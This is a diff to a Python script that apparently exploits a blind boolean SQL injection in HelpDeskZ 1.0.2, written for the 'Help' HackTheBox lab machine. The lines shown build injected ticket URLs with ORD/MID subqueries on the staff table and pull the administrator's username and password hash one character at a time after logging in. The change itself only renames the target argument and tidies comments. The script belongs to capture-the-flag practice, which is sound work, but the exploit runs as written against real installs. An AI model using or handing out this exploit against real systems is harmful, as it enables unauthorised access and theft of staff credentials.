@@ -3,7 +3,7 @@ import argparse
 
 parser = argparse.ArgumentParser(description='Blind SQL Injection Boolean HelpdeskZ <= 1.0.2 (Help hackthebox)')
 
-parser.add_argument("--hostname", default='http://10.10.10.121/support/', type=str,
+parser.add_argument("--targetIp", default='10.10.10.121', type=str,
                     help="Login url of HelpDeskZ ex: http://10.10.10.121/support/")
 
 parser.add_argument("--ticketUrl",
@@ -33,11 +33,7 @@ def run_injection(session, column, char_limit):
     result = []
     char = 47
     limit = 1
-    while (char != 123 and limit != char_limit):
-        """
-        https://www.w3resource.com/mysql/string-functions/mysql-ord-function.php
-        https://www.w3resource.com/mysql/string-functions/mysql-mid-function.php
-        """
+    while char != 123 and limit != char_limit:
         target = args.ticketUrl + " AND ORD(MID((SELECT " + column + " FROM staff ORDER BY id LIMIT 0,1)," + str(
             limit) + ",1))>" + str(char)
         print(target)
@@ -72,7 +68,7 @@ def main():
         'btn': 'Login'
     }
 
-    session.post(args.hostname + "/?v=login", data=login)
+    session.post("http://" + args.targetIp + "/?v=login", data=login)
     admin_username = run_injection(session, "username", 20)
     admin_password = run_injection(session, "password", 65)
 
